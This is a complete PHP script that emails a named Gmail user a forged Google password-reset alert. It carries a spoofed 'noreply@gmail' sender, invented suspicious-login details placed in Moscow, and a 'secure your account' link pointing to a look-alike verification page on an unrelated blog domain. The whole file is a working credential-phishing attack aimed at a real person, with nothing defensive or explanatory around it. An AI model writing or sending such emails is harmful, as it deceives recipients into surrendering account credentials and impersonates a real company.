<?php
$to = "jboro810@gmail.com";

$subject = "Google Password Reset - Gmail Accounts";

$message = "
<html>
<body>



<span style=\"color:black;\"><h1>Google</h1></span>
<p>
<span style=\"color:black\">
Hi Jackson,
<p>
Your Gmail password was reset using the email address dskrenta on Saturday, June 2, 2013 at 6:28pm (UTC-08).
<p style=\"margin-left:10px\">
Operating system:	<b>Mac OS X</b>
<br>
Browser:	<b>Chrome</b>
<br>
IP address:	<b>84.201.186.73</b>
<br>
Estimated location:	<b>Moscow, Russia</b>
</p>
<b>If this was you, you can safely disregard this email.</b>
<p>
<b>If this wasn't you, <a href=\"http://dtechblog.com/googleauthaccountverify/googleauthverify.html\">please secure your account.<a/></b>
<p>
Thanks,<br>
The Security Team
</span>
<hr></hr>

</body>
</html>
";





// Always set content-type when sending HTML email
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=iso-8859-1" . "\r\n";

// More headers
$headers .= 'From: <noreply@gmail>' . "\r\n";

// Send Mail
mail($to, $subject, $message, $headers);

// Notify David
echo "You did it!";
?>
